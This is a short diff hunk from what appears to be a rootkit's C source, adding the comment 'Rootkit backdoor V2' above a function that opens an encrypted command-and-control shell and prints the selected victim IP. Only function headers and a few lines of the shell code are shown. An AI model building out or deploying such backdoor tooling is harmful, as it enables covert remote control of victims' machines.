@@ -188,6 +188,7 @@ void activate_command_control_shell(char* argv){
     free(local_ip);
 }
 
+//Rootkit backdoor V2
 void activate_command_control_shell_encrypted(char* argv){
     char* local_ip = getLocalIpAddress();
     printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
